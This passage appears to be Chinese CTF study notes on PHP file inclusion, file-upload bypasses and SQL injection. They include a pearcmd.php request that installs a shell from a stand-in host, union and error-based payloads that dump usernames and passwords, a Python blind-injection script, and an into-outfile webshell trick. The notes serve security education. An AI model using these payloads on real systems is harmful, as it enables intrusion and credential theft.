+</span></span><span class=line><span class=cl><span class=n>data</span><span class=p>:</span><span class=o>//</span><span class=n>text</span><span class=o>/</span><span class=n>plain</span><span class=p>;</span><span class=n>base64</span><span class=p>,</span><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span> <span class=err>?</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=n>data</span><span class=p>:,</span><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span> <span class=err>?</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>phar协议</span>
+</span></span></code></pre></div><p>include &ldquo;/var/www/html/flag.php&rdquo;;</p><p>一 文件名可控</p><p>$file=$_GET[&lsquo;file&rsquo;];</p><p>include $file.".php&rdquo;; //用php伪协议 ，可以使用data协议</p><p>二 文件后缀可控</p><p>$file=$_GET[&lsquo;file&rsquo;];</p><p>include &ldquo;/var/www/html/&rdquo;.$file; //不能使用伪协议了</p><p>/var/www/html/../../../../../flag</p><p>高级文件包含</p><p>一 nginx日志文件包含</p><p>nginx 可以认为它是http的一个服务器软件，提供了http服务 ，默认监听80端口</p><p>http://localhost/123.php?a=b</p><p>123.php 后缀是否是.php .就进行一次转发，转发到本地的127.0.0.1的9000端口</p><p>9000端口，是被另一个服务端软件监听，它提供解析php文件的服务，我们把这个软件，叫做php-fpm</p><p>专门解析php后缀的文件，执行里面代码，将执行结果交给nginx,再由nginx返回给http的客户端，这个客户端就是浏览器</p><p>http://localhost/123.jpg</p><p>123.jpg 非php后缀，那么由自己处理，nginx会找到web目录，读取123.jpg的内容，并返回给浏览器，同时告诉浏览器，我返回的
+文件内容是一个jpg图片，你按照图片模式进行渲染，于是，浏览器页面上就能显示出一张图片出来</p><p><img src=photo/1.png alt></p><p>日志包含的前提条件</p><p>1 有文件名可控的文件包含点
+2 有可以访问到的日志路径 默认nginx的日志路径为 /var/log/nginx/access.log</p><p>二 临时文件包含</p><p>/tmp/php??????</p><p>文件包含，能否包含一个 /???/????????[@-[]]</p><p>答案是：不行 文件包含，是不支持通配符</p><p>我们明确的，得到这个临时目录下php开头的随机文件名字全称，然后我们就可以正常包含进去</p><p>默认情况，生命周期与php脚本一致，也就是说，脚本运行过程中，存在，脚本运行结束了，这个临时文件会被自动删除</p><p>突破点：
+1 在php脚本运行过程中，包含临时文件
+2 在脚本运行过程中，得到完整的临时文件名称</p><p>php配置文件中，默认，每次向浏览器发送内容时，不是一个字符一个字符发送的，它是一块内容一块内容发送的
+4096个字符</p><p>假设我们能够访问phpinfo的结果 FILES 就会存在tmp_name临时文件名字，读取后可以成功包含</p><p>phpinfo_lfi</p><p>三 php的session文件包含，upload_progress文件包含</p><p>强制文件上传时，通过上传一个固定的表单PHP_SESSION_UPLOAD_PROGRESS ，可以往服务器的session文件内写入我们的指定内容</p><p>然后在脚本运行过程中
+包含后，可以执行里面的php代码</p><p>四 pear文件包含</p><p>条件：</p><p>1 有文件包含点
+2 开启了pear扩展
+3 配置文件中register_argc_argv 设置为On,而默认为Off</p><p>PEAR扩展</p><p>PHP Extension and Application Repository</p><p>默认安装位置是 /usr/local/lib/php/</p><p>利用Pear扩展进行文件包含</p><p>方法一 远程文件下载</p><p>?file=/usr/local/lib/php/pearcmd.php&amp;ctfshow+install+-R+/var/www/html/+http://your-shell.com/shell.php</p><p>方法二 生成配置文件，配置项传入我们恶意的php代码的形式</p><p>a=b</p><p>username=root
+man_dir=</p><p>ctfshow.php
+GET /?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/ctf.php+-d+man_dir=+-s+</p><p>方法三 写配置文件方式</p><p>GET /?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/+1.php</p><p>五 远程文件包含</p><p>通过域名转数字的形式，可以不用.来构造远程文件地址</p><p><a href=http://www.msxindl.com/tools/ip/ip_num.asp>http://www.msxindl.com/tools/ip/ip_num.asp</a></p><p>?file=http://731540450/1</p><h2 id=php的文件上传><a class=header-anchor href=#php%e7%9a%84%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0></a>php的文件上传</h2><p>/tmp/php??????</p><p>1 php的文件上传绕过 黑名单绕过</p><p>后缀替换为空时，我们通过提交 1.pphphp 替换php为空后，得到1.php 成功写入木马</p><p>php3 php5 phps phtml</p><p>php后缀替换为txt时，我们无法双写绕过，1.pphphp 1.ptxthp</p><p>2 php文件上传的00截断</p><p>hello world</p><p>hello空格world\n\00</p><p>123.php 明显不让直接上传</p><p>123.php%00.jpg 那么后台判断的时候，取最后一个点后面的字符作为后缀 jpg 看起来是合法的文件名称</p><p>./upload/123.php%00.jpg -> ./upload/123.php</p><p>00字符截断需要的版本</p><p>php版本小于5.3.4 而最新的php版本已经达到8.1
+java版本小于7u40,而最新的java版本已经达到20以上</p><p>3 iconv字符转换异常后造成了字符截断</p><p>php在文件上传场景下的文件名字符集转换时，可能出现截断问题</p><p>utf-8字符集 默认的字符编码范围的是0x00-0x7f</p><p>iconv转换的字符不在上面这个范围之内，低版本的php会报异常，报了异常以后，后续字符不再处理</p><p>就会造成截断问题</p><p>123.php%df.jpg 123.php</p><p>php版本低于5.4才可以使用</p><p>4 文件后缀是白名单的时候的绕过</p><p>白名单：只准上传这几个后缀 因为匹配的内容少 所以限制的范围就大
+黑名单：不准上传这几个后缀 因为匹配的内容多 所以限制的范围就小 仅限于自己制定的几个，除了这几个，其他都行</p><p>1） web服务器的解析漏洞绕过</p><p>apache</p><pre><code>a 多后缀解析漏洞  当我们上传apache不认识的后缀时，apahce会继续往前找后缀，找到认识的就
+解析执行
+	  123.txt.ctfshow  123.txt  文本文档形式解析
+
+      123.php.ctfshow  123.php  就交给中间件处理php脚本
+
+b ImageMagic组件白名单绕过
+
+      目标主机按照了这个漏洞版本的ImageMagic插件 &lt;=3.3.0
+      在php.ini中启用了这个插件
+      通过了php new Imageick 对象的方式来处理图片时
+      且 php版本大于 5.4时  
+
+      才可以使用，上传特定的svg图片，来实现组件的缺陷导致任意代码执行
+</code></pre><p>nginx 基于错误的nginx配置 和 php-fpm配置，当我们访问 123.txt/123.php</p><pre><code>     cgi.fix_pathinfo 默认开启  123.txt/123.php  当123.php不存在时，会找/前面的文件进行php解析，这时候，就成功解析了123.txt为php脚本了
+</code></pre><p>iis Windows下使用 iis6.0版本中，如果解析的目录名字为 xxx.asp 那么里面的所有文件，都会按照asp来解析 123.txt WindowsXP Windows Server 2003</p><p>高级文件绕过</p><p>1 .htaccess nginx.htaccess</p><pre><code> php.ini     
+
+ 虚拟主机时代     一个物理服务器，里面可能存放几十上百个网站   每个网站，一个目录 
+
+ A 网站  需要这样的php.ini配置
+ B 网站  却需要那样的php.ini配置
+ C 网站  又需要另外的php.ini配置 
+
+ 总的php.ini不动，A B C 3个网站分别在自己目录定义自己的配置，作用域也仅限于自己目录 
+
+ 自定义配置文件   .htaccess nginx.htaccess
+
+ 在nginx 下，默认使用.user.ini 配置文件来进行php的配置
+
+ 使用
+
+ auto_append_file=123.txt  来让任意的php文件包含123.txt，执行里面的php代码
+
+ 疑问：为什么使用.user.ini来自动附加文件的时候，需要一个php文件呢
+</code></pre><p>2 服务端内容检测</p><p>不局限检测文件名，还会检测文件的后缀 文件的内容</p><p>*/
+?></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>8 jpg二次渲染绕过
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  使用专用图来生成jpg木马，实现经过二次渲染后，我们的恶意代码，依然能够保留在图片中，通过文件包含，执行里面的php代码
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>9 phar文件上传绕过
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>需要修改配置项
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>phar.readonly = Off（默认为On）
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>## SQL注入
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>### 什么是sql
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sql是一门语言，通过sql语句可以快速实现数据的增上改查 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Create 增
+</span></span><span class=line><span class=cl>Delete 删
+</span></span><span class=line><span class=cl>Update 改
+</span></span><span class=line><span class=cl>Read   查
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>CURD  就是指对数据的增删改查
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>什么是数据库
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>关系型数据库
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>非关系型数据库
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>关系型数据库
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>把所有的数据变为表格存放
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>常见有
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Oracle
+</span></span><span class=line><span class=cl>Mysql/MariaDB
+</span></span><span class=line><span class=cl>SQLServer
+</span></span><span class=line><span class=cl>Access 
+</span></span><span class=line><span class=cl>Sqlite 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>非关系型数据库
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>nosql数据库
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sns 社交软件 web2.0  所有内容 由用户产生   并 由用户消费  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Membase
+</span></span><span class=line><span class=cl>MongoDB
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Mysql/Mariadb 为主
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>博客系统代码
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sql语句
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>```sql
+</span></span><span class=line><span class=cl>select id,username,password from user;
+</span></span><span class=line><span class=cl>update page set title=&#39;aaa&#39;,content=&#39;bbb&#39; where id =1;
+</span></span><span class=line><span class=cl>delete from page where id =1;
+</span></span><span class=line><span class=cl>insert into page (title,content) values(&#39;aaa&#39;,&#39;bbb&#39;);
+</span></span></code></pre></div><p>php语句</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$conn</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=nv>$host</span><span class=p>,</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>,</span><span class=nv>$db</span><span class=p>,</span><span class=nv>$port</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$conn</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>();</span>     		<span class=c1>#执行sql语句
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$result</span><span class=o>-&gt;</span><span class=na>fetch_all</span><span class=p>();</span>       <span class=c1>#拿到所有结果
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$result</span><span class=o>-&gt;</span><span class=na>fetch_array</span><span class=p>();</span>     <span class=c1>#拿到一行结果
+</span></span></span></code></pre></div><p>sql注入的危害</p><p>歪曲了sql语句的执行结果
+泄露了数据库中的敏感数据
+干扰查询结果，劫持查询的流程，绕过了权限检查
+通过文件操作写入恶意代码，可能造成rce</p><h3 id=sql注入的类型><a class=header-anchor href=#sql%e6%b3%a8%e5%85%a5%e7%9a%84%e7%b1%bb%e5%9e%8b></a>sql注入的类型</h3><h4 id=数字型注入和union-注入><a class=header-anchor href=#%e6%95%b0%e5%ad%97%e5%9e%8b%e6%b3%a8%e5%85%a5%e5%92%8cunion-%e6%b3%a8%e5%85%a5></a>数字型注入和union 注入</h4><p>http://127.0.0.1/page_detail.php?id=1 union select 1,(select password from user where username=&lsquo;admin&rsquo;),3 limit 1,2</p><h4 id=字符型注入><a class=header-anchor href=#%e5%ad%97%e7%ac%a6%e5%9e%8b%e6%b3%a8%e5%85%a5></a>字符型注入</h4><p>前面闭合 后面注释 来逃逸出单引号或者双引号
+http://127.0.0.1/page_detail.php?id=1&rsquo; union select 1,(select password from user where username=&lsquo;admin&rsquo;),3 limit 1,2%23</p><p>查所有表</p><p>http://127.0.0.1/page_detail.php?id=1&rsquo; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 limit 1,2%23</p><p>查所有列</p><p>http://127.0.0.1/page_detail.php?id=1&rsquo; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&lsquo;user&rsquo; and table_schema=database()),3 limit 1,2%23</p><p>查敏感数据</p><p>http://127.0.0.1/page_detail.php?id=1&rsquo; union select 1,(select group_concat(username,&rsquo;-&rsquo;,password) from user),3 limit 1,2%23</p><p>注释两种形式 # &ndash;空格</p><h4 id=类型三布尔盲注><a class=header-anchor href=#%e7%b1%bb%e5%9e%8b%e4%b8%89%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8></a>类型三：布尔盲注</h4><p>boolean 盲注</p><p>条件：
+没有明显的回显点
+只有得到两个结果，如果执行正常，页面不报错，执行不正常，页面报错</p><p>我们执行了我们自定义的sql语句，如果语句是正确的，或者说，语句内我们的猜测是正确的，就返回正常或者特定页面，否则返回错误页面或者其他特定页面</p><p>1 当我们猜对(sql执行正常)情况下，页面没有报错
+2 当我们猜错(sql执行不下去)情况下，页面报错</p><p>基于上面的原理，我们可以发送大量的请求，来猜测我们需要的数据</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username=admin&amp;password=admin123
+</span></span><span class=line><span class=cl>&amp;不编码当做分隔符
+</span></span><span class=line><span class=cl>&amp;编码后当做数据传入
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=p>,</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;sad&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>substr</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=o>#</span><span class=k>and</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;8888&#39;</span><span class=p>;</span><span class=w>
+</span></span></span></code></pre></div><p>盲注脚本</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/day7/login.php&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_username</span><span class=p>(</span><span class=n>username_length</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>username</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>sts</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>username_length</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>sts</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;aa&#39; or substr(username,</span><span class=si>{</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>,1)=&#39;</span><span class=si>{</span><span class=n>s</span><span class=si>}</span><span class=s2>&#39; and id=1;#&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;ctf&#34;</span>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;正在测试第</span><span class=si>{</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>位是否是&#34;</span><span class=o>+</span><span class=n>s</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;成功&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;猜测正确，第</span><span class=si>{</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>位是&#34;</span><span class=o>+</span><span class=n>s</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=n>username</span> <span class=o>=</span> <span class=n>username</span> <span class=o>+</span> <span class=n>s</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>username</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_length</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;aa&#39; or length(username)=</span><span class=si>{</span><span class=n>s</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2> and id=1;#&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;ctf&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;正在测试用户名是否是</span><span class=si>{</span><span class=n>s</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>位&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;成功&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;猜测正确，用户名是</span><span class=si>{</span><span class=n>s</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>位&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=n>s</span><span class=o>+</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ret</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span><span class=o>==</span><span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>username_length</span> <span class=o>=</span> <span class=n>check_length</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>check_username</span><span class=p>(</span><span class=n>username_length</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
+</span></span></code></pre></div><h4 id=类型四报错注入><a class=header-anchor href=#%e7%b1%bb%e5%9e%8b%e5%9b%9b%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5></a>类型四：报错注入</h4><p>条件：</p><p>1 没有明显的回显点
+2 有mysql执行sql语句的报错信息</p><p>a. 利用updatexml函数来强制报错，带出我们的查询结果</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>username</span><span class=o>=</span><span class=n>s</span><span class=s1>&#39;  or updatexml(1,concat(&#39;</span><span class=o>~</span><span class=s1>&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;</span><span class=o>~</span><span class=s1>&#39;),1)--+&amp;password=fs
+</span></span></span><span class=line><span class=cl><span class=s1>#查询数据库表名
+</span></span></span><span class=line><span class=cl><span class=s1>username=s&#39;</span><span class=w>  </span><span class=k>or</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=s1>&#39;~&#39;</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;user&#39;</span><span class=p>),</span><span class=s1>&#39;~&#39;</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=c1>--+&amp;password=fs
+</span></span></span><span class=line><span class=cl><span class=c1>-- 查询表中列名
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>username</span><span class=o>=</span><span class=n>s</span><span class=s1>&#39;  or updatexml(1,concat(&#39;</span><span class=o>~</span><span class=s1>&#39;,(select group_concat(username,&#39;</span><span class=o>~</span><span class=s1>&#39;,password) from user),&#39;</span><span class=o>~</span><span class=s1>&#39;),1)--+&amp;password=fs
+</span></span></span><span class=line><span class=cl><span class=s1>-- 查数据
+</span></span></span><span class=line><span class=cl><span class=s1>#因为一次只能返回32个字符，需要使用substr来依次查看substr(查询的数据,从第几位开始,步长)
+</span></span></span><span class=line><span class=cl><span class=s1>username=s&#39;</span><span class=w>  </span><span class=k>or</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=s1>&#39;~&#39;</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>substr</span><span class=p>(</span><span class=n>group_concat</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=s1>&#39;~&#39;</span><span class=p>,</span><span class=n>password</span><span class=p>),</span><span class=mi>30</span><span class=p>,</span><span class=mi>30</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=p>),</span><span class=s1>&#39;~&#39;</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=c1>--+&amp;password=fs
+</span></span></span></code></pre></div><p>username=admin&rsquo; or updatexml(1,concat(&rsquo;^&rsquo;,(select group_concat(column_name) from information_schema.columns where table_name=&lsquo;user&rsquo; and table_schema=database()),&rsquo;^&rsquo;),1)%23&amp;password=123123</p><p>b. extractvalue 和updatexml 功能一样，也是通过报错带出查询数据用</p><p>c. 整数溢出报错 exp pow cot</p><p>d. 不存在函数报错 select ctfshow(); 很鸡肋只能查出数据库</p><h4 id=类型五堆叠注入><a class=header-anchor href=#%e7%b1%bb%e5%9e%8b%e4%ba%94%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5></a>类型五：堆叠注入</h4><p>我们控制的语句，可以执行多条sql</p><p>注意点：
+需要后台代码支持多条语句执行，而这个支持，需要不同于上面的代码写法</p><p>强网杯 随便注</p><p>通过分号分隔多条sql语句，实现了修改表结构，甚至删除表数据等等结果</p><p>如果可以堆叠，大家应该首先考虑 存储过程 set @a=&lsquo;sele&rsquo;;set @b=&lsquo;ct&rsquo;;set @c=@a+@b;</p><p>存储过程 类似与 shell的函数 可以自定义函数</p><h4 id=类型六时间盲注><a class=header-anchor href=#%e7%b1%bb%e5%9e%8b%e5%85%ad%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8></a>类型六：时间盲注</h4><p>条件：
+没有明显的回显点
+页面也没有明显的变化，即使sql语句执行不成功</p><p>总结：
+可以执行sql注入，但是不知道执行结果，也不知道执行了没，甚至不知道报错了没</p><p>原理：</p><p>猜测某个条件，如果成立，就sleep 几秒</p><p>select id,username,password from user where username = &lsquo;admin&rsquo; and if((select substr(username,1,1) from user where id = 1)=&lsquo;a&rsquo;,sleep(3),1);</p><p>a sleep进行延迟</p><p>b benchmark(count,exp)</p><p>如果执行一个比较耗时的表达式，非常多的次数，加起来，就有可能造成延时的效果</p><p>c 笛卡尔积延迟法</p><p>select count(<em>) from user A,user B;
+SELECT count (</em>) FROM information_schema.columns A,information_schema.columns B,information_schema.tables C;</p><p>select count(*) from information_schema.tables,information_schema.columns b,user as c,user as d,user as e,user as f;</p><p>if(2>1,延迟语句，1)</p><p>d get_lock函数延迟法</p><p>select get_lock(&lsquo;a&rsquo;,3);</p><p>条件：针对数据库连接的长连接有效</p><p>php 一般 解释执行完毕后，就会关闭数据库连接，下次请求的时候再次连接数据库
+java 维护一个数据库连接池，长时间连接，需要处理请求时，拿出来进行sql查询，查询完后，放回数据库连接池</p><p>e rlike
+通过大量的正则匹配来实现延迟</p><h4 id=类型七二次注入><a class=header-anchor href=#%e7%b1%bb%e5%9e%8b%e4%b8%83%e4%ba%8c%e6%ac%a1%e6%b3%a8%e5%85%a5></a>类型七：二次注入</h4><p>条件：</p><p>1 无法直接注入，但是可以把要注入的数据插入数据库中</p><p>2 其他地方引用数据库中的数据，拼接sql语句时，默认不再进行过滤，直接拼接，造成曲线控制了sql语句</p><p>1 整数型注入/union联合注入
+2 字符型注入
+3 布尔盲注
+4 报错注入
+5 堆叠注入
+6 时间盲注
+7 二次注入</p><p>不同注入点的应对技巧</p><p>sql语句分为CURD操作</p><p>select 注入</p><p>1 当我们控制点在where 之后，则尝试 闭合参数引号，有回显就联合注入，有报错，就报错注入等等</p><p>2 select title,content from page;</p><p>select (select password from user where username=&lsquo;admin&rsquo;) ,content from page;</p><p>3 注入点在 group by 或者oder by之后 时间盲注</p><p>select title,content from page order by title;</p><p>select title,content from page order by title,if(2>1,sleep(3),1);</p><p>select * from page order by title,if((select substr(username,1,1) from user where id=1)=&lsquo;a&rsquo;,sleep(3),1);</p><p>4 注入点在limit 之后 5.6版本之前 8以后废弃</p><p>select title,content from page limit 1;</p><p>select title,content from page limit 1 procedure analyse(updatexml(1,concat("^",(select user()),"^"),1));</p><p>包括一些小技巧</p><p>1 字符串可以转为16进制来用
+select 0x63746673686f77</p><p>2 相同或者类似功能的函数相互替换</p><p>substr sustring</p><p>类似cat 用tac替代绕过检测</p><p>3 mysql 还可以使用into outfile &lsquo;/var/www/html/1.php&rsquo; 的形式，从数据读取，转为数据写入，从而实现代码执行
+如果mysql对那个目录有写权限</p><h2 id=序列化基础知识引入><a class=header-anchor href=#%e5%ba%8f%e5%88%97%e5%8c%96%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86%e5%bc%95%e5%85%a5></a>序列化基础知识引入</h2><h3 id=类与对象><a class=header-anchor href=#%e7%b1%bb%e4%b8%8e%e5%af%b9%e8%b1%a1></a>类与对象</h3><p>//用户类</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>//属性和方法的集合
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span>  <span class=nc>user</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>  <span class=c1>//共有属性
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=nv>$password</span><span class=p>;</span> <span class=c1>//私有属性
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>protected</span> <span class=nv>$userType</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=nv>$platform</span><span class=o>=</span><span class=s2>&#34;ctfshow&#34;</span><span class=p>;</span>
